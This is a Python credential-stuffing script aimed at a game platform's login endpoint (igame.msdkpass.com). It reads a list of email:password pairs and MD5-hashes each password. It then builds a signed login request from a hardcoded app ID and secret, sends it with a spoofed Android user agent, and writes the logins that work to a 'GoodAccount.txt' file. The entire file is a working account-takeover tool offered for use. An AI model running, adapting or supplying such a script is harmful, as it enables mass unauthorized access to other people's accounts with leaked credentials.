#!/usr/bin/python3
import requests
import random
import string
import hashlib
Att = 0
err0r = 0
for i in open('user_pass_list.txt', 'r').read().splitlines():
	#user_pass_list.txt example:
	#line by line : 
	# testemail@gmail.com:3993E93923
	# test2@yahoo.com:AA123456
	# etc...
    i.strip()
    email = i.split(':')[0]
    password = i.split(':')[1]
    m = hashlib.md5(password.encode())
    pp = m.hexdigest()
    HAE = (
        f"/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=sa_SA&os=1{{\"account\":\"{email}\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"{pp}\"}}3ec8cd69d71b7922e2a17445840866b26d86e283")
    h = hashlib.md5(HAE.encode())
    sig = h.hexdigest()
    url = f'https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=sa_SA&os=1&sig=' + sig
    data = "{\"account\":\"" + email + \
        "\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"" + pp + "\"}"
    Random = str("".join(random.choice(string.digits)for i in range(7)))
    headers = {
        "Host": "igame.msdkpass.com",
        "Content-Type": "application/json; charset=utf-8",
        "Connection": "close",
        "Accept": "*/*",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.{Random}",
        "Accept-Language": "ar-US;q=1, en-US;q=0.9",
        "Accept-Encoding": "gzip",
        "Content-Length": "126"
    }
    req = requests.post(url, data=data, headers=headers).text
    if 'token' in req:
        Att += 1
        print(f'\r[ + ] {Att} : ', end='')
        with open("GoodAccount.txt", "a") as Save:
			Save.write(f'{email}:{password}\n')
	else:
		err0r += 1
		print(f'\r[ ! ] Hits {Att} / [-] Error {err0r}', end='')
input()
